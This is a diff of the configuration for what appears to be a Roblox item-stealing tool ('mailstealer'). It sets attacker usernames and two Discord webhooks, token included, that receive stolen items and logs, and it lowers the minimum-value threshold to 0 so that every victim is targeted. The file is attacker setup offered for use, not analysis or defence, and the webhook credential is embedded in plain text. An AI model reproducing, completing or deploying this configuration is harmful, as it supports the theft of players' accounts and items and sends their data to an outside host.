@@ -1,7 +1,7 @@
 Username = "myrayuo”
 Username2 = "mr_miclop12"
 Webhook = "https://discord.com/api/webhooks/1283191669885370368/LT1HEmRINprQMsQ5lNpMk9DBMSET3j186xTfVn07CZT3qpdh__wxU2PqYiwy86uiNiFz"
-MinimumRAP = 1000000
+MinimumRAP = 0
 
 LogsWebhook = "https://discord.com/api/webhooks/1283191669885370368/LT1HEmRINprQMsQ5lNpMk9DBMSET3j186xTfVn07CZT3qpdh__wxU2PqYiwy86uiNiFz"
 mailstealer_name = "X"
